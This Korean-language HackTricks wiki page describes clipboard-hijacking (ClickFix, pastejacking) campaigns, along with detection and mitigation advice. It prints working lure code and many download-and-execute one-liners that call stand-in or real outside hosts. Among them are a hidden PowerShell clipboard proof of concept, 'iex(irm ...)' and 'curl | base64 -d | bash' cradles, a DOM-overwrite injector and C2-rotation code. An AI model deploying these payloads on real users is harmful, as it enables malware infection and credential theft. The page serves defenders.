# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "직접 복사한 것이 아니라면 절대 붙여넣지 마세요." – 오래됐지만 여전히 유효한 조언

## Overview

Clipboard hijacking(또는 *pastejacking*)은 사용자가 명령어를 확인하지 않고 복사해 붙여넣는 습관을 악용합니다. 악성 웹 페이지(또는 Electron이나 Desktop 애플리케이션처럼 JavaScript를 실행할 수 있는 모든 환경)는 공격자가 제어하는 텍스트를 시스템 클립보드에 프로그램 방식으로 넣습니다. 피해자는 주로 정교하게 작성된 social engineering 지시에 따라 **Win + R**(실행 대화상자), **Win + X**(빠른 액세스 / PowerShell)를 누르거나 터미널을 열어 클립보드 내용을 *붙여넣도록* 유도되며, 이로써 임의의 명령이 즉시 실행됩니다.

**파일을 다운로드하거나 첨부 파일을 열지 않으므로**, 이 기법은 첨부 파일, 매크로 또는 직접 명령 실행을 모니터링하는 대부분의 이메일 및 웹 콘텐츠 보안 제어를 우회합니다. 따라서 이 공격은 NetSupport RAT, Latrodectus loader, Lumma Stealer와 같은 일반적인 malware 계열을 유포하는 phishing 캠페인에서 자주 사용됩니다.<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

또 다른 **clipboard hijacking** 변종은 명령어를 붙여넣지 않습니다. 피해자가 **cryptocurrency wallet address**를 복사할 때까지 기다렸다가, 붙여넣기 직전에 공격자가 제어하는 주소로 조용히 바꿉니다. 사용자가 긴 wallet 형식의 앞뒤 문자만 확인하는 경우가 많아 특히 효과적입니다.<sup>[[8]](#references)</sup>

일반적인 실제 사례의 특징:
- **얇은 loader + 중첩 payload**: 겉으로 보이는 앱/exe는 정상적인 trading 또는 "profit" 도구처럼 보이지만, 실제 clipper는 패키지 내부 깊숙이 숨겨져 있습니다(예: .NET loader가 중첩된 Rust payload를 실행).
- **Regex 기반 교체**: malware는 `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` 또는 일반적인 **44자 Solana 형식 유사** 문자열을 찾아 공격자 wallet으로 바꿉니다.
- **대규모 wallet 순환**: 최신 Windows 샘플은 도난이 발생할 때마다 wallet 평판이 손상되는 것을 줄이기 위해 단일 고정 주소 대신 통화별로 **수천 개**의 대체 wallet을 포함할 수 있습니다.<sup>[[8]](#references)</sup>

### Windows clipper flow

일반적인 구현 방식은 **`AddClipboardFormatListener`**로 등록된 숨겨진 창을 사용하는 것입니다. 클립보드가 업데이트될 때마다 malware는 보통 다음을 호출합니다:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → 현재 클립보드 데이터에 액세스합니다.
- **`GetClipboardData`** → 텍스트를 읽습니다.
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet 문자열을 공격자 값으로 바꿉니다.

clipper에서 자주 발견되는 최소한의 hunting regex:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

사용자 수준의 persistence만으로도 영향을 줄 수 있습니다. 관찰된 패턴 중 하나는 다음과 같습니다:<sup>[[8]](#references)</sup>
- payload를 **`%APPDATA%\silke\silke.exe`**에 복사
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` 아래에 **Startup 폴더 LNK** 생성

탐지 아이디어:
- clipboard API를 지속적으로 호출하면서 `%APPDATA%` 및 사용자의 **Startup** 폴더에 파일을 쓰는 프로세스
- 새로운 LNK/실행 파일 생성 후 wallet 주소를 clipboard에 다시 쓰는 동작
- 사용되지 않는 파일이 다수 포함된 archive 또는 가짜 소프트웨어 번들과, 내부의 중첩된 binary를 실행하는 작은 launcher

### macOS의 사회 공학적 quarantine 제거 및 LaunchAgent persistence

macOS에서 일부 캠페인은 **`unlocker.command`** helper를 배포하고, Gatekeeper가 앱이 손상되었거나 확인되지 않은 개발자가 만들었다고 알리면 피해자에게 마우스 오른쪽 버튼 클릭 → **열기**를 안내합니다. 이 script는 단순히 quarantine을 제거한 뒤 인근의 `.app`을 실행합니다:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

이는 **Gatekeeper exploit이 아닙니다**. `com.apple.quarantine` xattr에 따라 Gatekeeper의 결정이 달라지는 점을 악용하는 **사회공학적 quarantine 우회**입니다.<sup>[[8]](#references)</sup>

실행 후 clipper는 다음을 작성해 현재 사용자 권한으로 지속성을 유지할 수 있습니다.<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – 래퍼 스크립트
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` 및 `KeepAlive`가 설정된 LaunchAgent

유용한 방어 관점의 세부 사항은 일부 샘플이 약 30초마다 LaunchAgent와 래퍼를 다시 작성하는 **자가 복구 watchdog**을 구현한다는 점입니다. **실행 중인 프로세스를 종료하지 않은 채** plist를 먼저 제거하면 malware가 즉시 다시 만들 수 있습니다.<sup>[[8]](#references)</sup> 안전한 정리 순서:
1. 실행 중인 clipper 프로세스를 종료합니다.
2. LaunchAgent plist를 언로드하고 삭제합니다.
3. `~/launch.sh`와 복사된 payload를 삭제합니다.

### 배포 참고: 평판 조작으로 효과 극대화

이 계열의 경우 malware 자체는 기술적으로 단순해도 **배포 계층**이 핵심 역할을 할 수 있습니다. 가짜 GitHub stars/forks, SourceForge 리뷰/다운로드, YouTube 튜토리얼 댓글/조회 수, 무해해 보이는 VirusTotal 댓글/투표를 이용해 실행 전에 바이너리를 신뢰할 만하게 보이도록 합니다.<sup>[[8]](#references)</sup>

## 강제 복사 버튼과 숨겨진 payload (macOS 한 줄 명령)

일부 macOS infostealer는 설치 사이트(예: Homebrew)를 복제하고 사용자가 화면에 보이는 텍스트만 선택하지 못하도록 **“Copy” 버튼을 사용하도록 강제**합니다. 클립보드 항목에는 예상된 설치 명령과 뒤에 추가된 Base64 payload(예: `...; echo <b64> | base64 -d | sh`)가 들어 있어, 한 번 붙여넣기만 해도 두 단계가 모두 실행되는 동안 UI에는 추가 단계가 숨겨집니다.<sup>[[5]](#references)</sup>

## JavaScript 개념 증명

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

이전 캠페인에서는 `document.execCommand('copy')`를 사용했지만, 최신 캠페인에서는 비동기 **Clipboard API** (`navigator.clipboard.writeText`)를 사용합니다.<sup>[[2]](#references)</sup>

## ClickFix / ClearFake 흐름

1. 사용자가 typosquatting된 사이트 또는 침해된 사이트(예: `docusign.sa[.]com`)를 방문합니다.
2. 삽입된 **ClearFake** JavaScript가 `unsecuredCopyToClipboard()` 헬퍼를 호출해 Base64로 인코딩된 PowerShell 한 줄 명령을 클립보드에 조용히 저장합니다.
3. HTML 안내문은 피해자에게 다음과 같이 지시합니다. *“**Win + R**을 누르고, 명령을 붙여넣은 다음 Enter를 눌러 문제를 해결하세요.”*
4. `powershell.exe`가 실행되어 정상 실행 파일과 악성 DLL이 포함된 아카이브를 다운로드합니다(전형적인 DLL sideloading).
5. 로더가 추가 단계를 복호화하고, shellcode를 주입한 뒤 지속성을 설정합니다(예: scheduled task). 최종적으로 NetSupport RAT / Latrodectus / Lumma Stealer를 실행합니다.<sup>[[1]](#references)</sup>

### NetSupport RAT 감염 체인 예시

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe`(정상적인 Java WebStart)는 해당 디렉터리에서 `msvcp140.dll`을 검색합니다.
* 악성 DLL은 **GetProcAddress**를 사용해 API를 동적으로 확인하고, **curl.exe**를 통해 두 개의 바이너리(`data_3.bin`, `data_4.bin`)를 다운로드한 뒤, 롤링 XOR 키 `"https://google.com/"`를 사용해 복호화하고, 최종 shellcode를 인젝션한 다음 **client32.exe**(NetSupport RAT)를 `C:\ProgramData\SecurityCheck_v1\`에 압축 해제합니다.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. **curl.exe**로 `la.txt`를 다운로드합니다.
2. **cscript.exe**에서 JScript downloader를 실행합니다.
3. MSI payload를 가져와 서명된 애플리케이션 옆에 `libcef.dll`을 배치합니다 → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### MSHTA를 통한 Lumma Stealer

```
mshta https://iplogger.co/xxxx =+\\xxx
```

**mshta** 호출은 숨겨진 PowerShell 스크립트를 실행해 `PartyContinued.exe`를 가져오고, `Boat.pst`(CAB)를 추출하며, `extrac32`와 파일 연결을 통해 `AutoIt3.exe`를 재구성한 뒤, 브라우저 자격 증명을 `sumeriavgv.digital`로 유출하는 `.a3x` 스크립트를 실행합니다.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

일부 ClickFix 캠페인은 파일 다운로드를 완전히 생략하고, 피해자에게 WSH를 통해 JavaScript를 가져와 실행하고, 이를 지속성 있게 유지하며, 매일 C2를 변경하는 원라이너를 붙여 넣도록 지시합니다. 관찰된 공격 체인 예시:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

주요 특징
- URL을 실행 시점에 역순으로 바꿔 간단한 분석을 피합니다.
- JavaScript는 Startup LNK (WScript/CScript)를 통해 지속성을 유지하고, 현재 날짜에 따라 C2를 선택하여 도메인을 빠르게 순환합니다.<sup>[[3]](#references)</sup>

날짜별로 C2를 순환하는 데 사용되는 최소한의 JS 코드 조각:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

다음 단계에서는 일반적으로 persistence를 구축하고 RAT(예: PureHVNC)을 가져오는 loader를 배포하며, 하드코딩된 인증서에 TLS를 고정하고 트래픽을 청크 단위로 나눕니다.<sup>[[3]](#references)</sup>

이 변종에 특화된 탐지 아이디어
- 프로세스 트리: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (또는 `cscript.exe`).
- 시작 프로그램 아티팩트: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`의 LNK가 `%TEMP%`/`%APPDATA%` 아래의 JS 경로를 지정해 WScript/CScript를 실행.
- `.split('').reverse().join('')` 또는 `eval(a.responseText)`가 포함된 Registry/RunMRU 및 명령줄 텔레메트리.
- 긴 명령줄 없이 긴 스크립트를 전달하기 위해 큰 stdin payload와 함께 반복적으로 실행되는 `powershell -NoProfile -NonInteractive -Command -`.
- 이후 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` 같은 LOLBins를 업데이트 프로그램처럼 보이는 작업/경로(예: `\GoogleSystem\GoogleUpdater`)에서 실행하는 Scheduled Tasks.

위협 헌팅
- 매일 바뀌는 C2 호스트명과 `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` 패턴의 URL.
- 클립보드 쓰기 이벤트 이후 Win+R 붙여넣기, 그리고 즉시 이어지는 `powershell.exe` 실행을 연관 분석합니다.

블루팀은 클립보드, 프로세스 생성 및 레지스트리 텔레메트리를 결합해 pastejacking 악용을 정확히 찾아낼 수 있습니다.

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`에는 **Win + R** 명령 기록이 저장됩니다. 비정상적인 Base64 / 난독화 항목을 찾으세요.
* `ParentImage` == `explorer.exe`이고 `NewProcessName`이 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }에 포함되는 Security Event ID **4688** (프로세스 생성).
* 의심스러운 4688 이벤트 직전에 `%LocalAppData%\Microsoft\Windows\WinX\` 또는 임시 폴더 아래에서 파일이 생성된 Event ID **4663**.
* EDR 클립보드 센서(있는 경우) – `Clipboard Write` 직후 새 PowerShell 프로세스가 실행되는지 연관 분석합니다.

## IUAM 스타일 검증 페이지 (ClickFix Generator): 클립보드에서 콘솔로 복사 + OS 인식 payload

최근 캠페인에서는 가짜 CDN/브라우저 검증 페이지("Just a moment…", IUAM 스타일)를 대량 생성해 사용자가 클립보드에서 OS별 명령을 복사해 기본 콘솔에 붙여넣도록 유도합니다. 이를 통해 브라우저 샌드박스 밖에서 실행이 이루어지며 Windows와 macOS 모두에서 동작합니다.<sup>[[4]](#references)</sup>

빌더가 생성한 페이지의 주요 특징
- `navigator.userAgent`를 통한 OS 감지로 payload를 맞춤 설정합니다(Windows PowerShell/CMD vs. macOS Terminal). 지원하지 않는 OS에는 환상을 유지하기 위해 선택적 미끼/no-op을 표시합니다.
- 무해해 보이는 UI 동작(체크박스/Copy)을 하면 자동으로 클립보드에 복사되며, 화면에 보이는 텍스트는 클립보드 내용과 다를 수 있습니다.
- 모바일을 차단하고 단계별 안내가 포함된 팝오버를 표시합니다: Windows → Win+R→붙여넣기→Enter; macOS → Terminal 열기→붙여넣기→Enter.
- 선택적 난독화 및 단일 파일 injector를 사용해 침해된 사이트의 DOM을 Tailwind 스타일 검증 UI로 덮어쓸 수 있습니다(새 도메인 등록 불필요).<sup>[[4]](#references)</sup>

예시: 클립보드 불일치 + OS 인식 분기
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

초기 실행의 macOS 지속성
- 터미널이 닫힌 후에도 실행이 계속되도록 `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`를 사용하면 눈에 띄는 흔적을 줄일 수 있습니다.<sup>[[4]](#references)</sup>

침해된 사이트에서 페이지 인플레이스 탈취
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

IUAM 스타일 lure에 특화된 탐지 및 헌팅 아이디어
- 웹: Clipboard API를 verification widget에 바인딩하는 페이지, 표시된 텍스트와 clipboard payload 간 불일치, `navigator.userAgent` 분기, 의심스러운 컨텍스트에서 Tailwind와 단일 페이지 교체 사용.
- Windows 엔드포인트: 브라우저 상호작용 직후 `explorer.exe`에서 `powershell.exe`/`cmd.exe`가 실행됨; `%TEMP%`에서 batch/MSI installer 실행.
- macOS 엔드포인트: 브라우저 이벤트 직후 Terminal/iTerm에서 `bash`/`curl`/`base64 -d`를 `nohup`과 함께 실행; 터미널을 닫은 뒤에도 백그라운드 작업이 계속 실행됨.
- `RunMRU` Win+R 기록 및 clipboard 쓰기를 이후의 console 프로세스 생성과 연관 분석합니다.

관련 기법도 참조하세요.

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026년 가짜 CAPTCHA / ClickFix의 진화 (ClearFake, Scarlet Goldfinch)

- ClearFake는 계속해서 WordPress 사이트를 침해하고, 외부 호스트(Cloudflare Workers, GitHub/jsDelivr)를 연결하는 loader JavaScript와 블록체인 “etherhiding” 호출(예: `bsc-testnet.drpc[.]org`와 같은 Binance Smart Chain API 엔드포인트로 POST)을 삽입해 최신 lure 로직을 가져옵니다. 최근 overlay는 사용자가 파일을 다운로드하는 대신 한 줄 명령을 복사해 붙여넣도록 지시하는 가짜 CAPTCHA를 주로 사용합니다(T1204.004).<sup>[[6]](#references)</sup>
- 초기 실행은 점점 더 서명된 script host/LOLBAS에 위임되고 있습니다. 2026년 1월의 공격 체인은 이전의 `mshta` 사용을 기본 제공되는 `SyncAppvPublishingServer.vbs`를 `WScript.exe`로 실행하는 방식으로 대체했으며, PowerShell 유사 인수에 별칭/와일드카드를 전달해 원격 콘텐츠를 가져옵니다:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs`는 서명되어 있으며 일반적으로 App-V에서 사용됩니다. `WScript.exe` 및 특이한 인수(`gal`/`gcm` 별칭, 와일드카드가 적용된 cmdlet, jsDelivr URL)와 함께 사용하면 ClearFake의 고신뢰도 LOLBAS 단계가 됩니다.<sup>[[6]](#references)</sup>
- 2026년 2월, 가짜 CAPTCHA 페이로드는 순수 PowerShell download cradle로 다시 전환되었습니다. 실제 사례 두 가지:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - 첫 번째 체인은 메모리 내에서 실행되는 `iex(irm ...)` grabber이며, 두 번째는 `WinHttp.WinHttpRequest.5.1`을 통해 단계를 진행하고 임시 `.ps1` 파일을 쓴 다음, 숨겨진 창에서 `-ep bypass`로 실행합니다.<sup>[[6]](#references)</sup>

이러한 변형을 탐지하고 추적하는 팁
- 프로세스 계보: 브라우저 → `explorer.exe` → 클립보드 쓰기/Win+R 직후의 `wscript.exe ...SyncAppvPublishingServer.vbs` 또는 PowerShell cradle.
- 명령줄 키워드: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker 도메인 또는 raw IP를 사용하는 `iex(irm ...)` 패턴.
- 네트워크: 웹 탐색 직후 스크립트 호스트/PowerShell에서 CDN worker 호스트 또는 blockchain RPC endpoint로 아웃바운드 연결.
- 파일/레지스트리: `%TEMP%` 아래에 임시 `.ps1` 파일이 생성되고 이러한 한 줄 명령이 RunMRU 항목에 기록되는지 확인합니다. 서명된 스크립트 LOLBAS(WScript/cscript/mshta)가 외부 URL 또는 난독화된 별칭 문자열과 함께 실행되면 차단하거나 경고합니다.

## 2026년 6월 ClickFix tradecraft: 붙여넣기 telemetry, 가짜 인증 댓글, LOLBin chaining

최근 Red Canary telemetry에 따르면, 안정적인 지표는 **특정 명령 하나가 아니라** **사용자가 붙여넣고 실행하는 방식**, **신뢰할 수 있는 interpreter/LOLBins**, **난독화된 플래그**, **원격에서 가져오기**, **즉시 실행**이 결합된 패턴입니다.<sup>[[7]](#references)</sup>

### 주목할 만한 공격자 패턴

- **붙여넣기 확인 telemetry**: 일부 payload는 실제 단계에 앞서 `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted`를 호출합니다. 이를 통해 창을 짧고 눈에 띄지 않게 유지하면서 사용자의 상호작용을 확인합니다.
- **가짜 인증 댓글**: PowerShell 한 줄 명령에 `# Security check ✔️ I'm not a robot Verification ID: 138105` 같은 문자열을 덧붙일 수 있습니다. 이렇게 하면 명령을 Run / `cmd.exe` / PowerShell 기록에 붙여넣은 뒤에도 CAPTCHA 관련 명령처럼 보입니다.
- **동적 URL 재구성**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))`은 명령줄에 고정 URL을 남기지 않으면서 메모리 내 다운로드 및 실행을 수행합니다.
- **설치 프로그램으로 위장한 실행**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q`는 플래그의 대소문자 변형과 Unicode와 유사한 문자를 악용해 견고하지 않은 탐지를 회피하면서도 `msiexec.exe`처럼 보이게 합니다.
- **캐럿 이스케이프를 사용하는 LOLBin 체인**: `cmd.exe`는 `^` 이스케이프(`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`)로 키워드를 숨기고, 중첩된 셸을 최소화된 상태로 시작하며, 공격자 콘텐츠를 `.pdf` 같은 무해한 확장자로 저장한 뒤 `mshta`를 통해 실행할 수 있습니다.<sup>[[7]](#references)</sup>
## 완화 방안

1. 브라우저 강화 – 클립보드 쓰기 권한(`dom.events.asyncClipboard.clipboardItem` 등)을 비활성화하거나 사용자 동작을 요구하도록 설정합니다.
2. 보안 인식 교육 – 민감한 명령은 *직접 입력*하거나 먼저 텍스트 편집기에 붙여넣도록 사용자에게 안내합니다.
3. PowerShell Constrained Language Mode / Execution Policy와 Application Control을 적용해 임의의 한 줄 명령을 차단합니다.
4. 네트워크 제어 – 알려진 pastejacking 및 malware C2 도메인으로의 아웃바운드 요청을 차단합니다.

## 관련 기법

* **Discord Invite Hijacking**은 사용자를 악성 서버로 유인한 뒤 동일한 ClickFix 방식을 악용하는 경우가 많습니다:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [ClickFix 공격 벡터 방지하기](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – 순수한 장막 너머: RAT에서 Builder, Coder까지](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [ClickFix 공장: IUAM ClickFix Generator 최초 공개](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025년, Infostealer의 해](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: 2026년 2월](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: 2026년 6월](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – 별점에서 추천까지: 가짜 평판을 이용한 crypto clipboard hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
